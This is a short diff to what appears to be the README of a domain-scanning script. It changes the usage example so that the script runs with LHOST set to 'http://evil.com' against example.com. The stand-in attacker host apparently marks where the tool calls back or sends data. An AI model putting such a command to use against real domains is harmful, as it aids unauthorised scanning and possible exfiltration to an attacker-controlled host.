@@ -83,7 +83,8 @@ dirsearch
 
 3. Run the script with the target domain:
    ```sh
-   ./wolfyash.sh example.com
+  LHOST="http://evil.com" ./Wolfyash.sh example.com
+
    ```
 
    Replace `<target>` with the domain you want to scan.
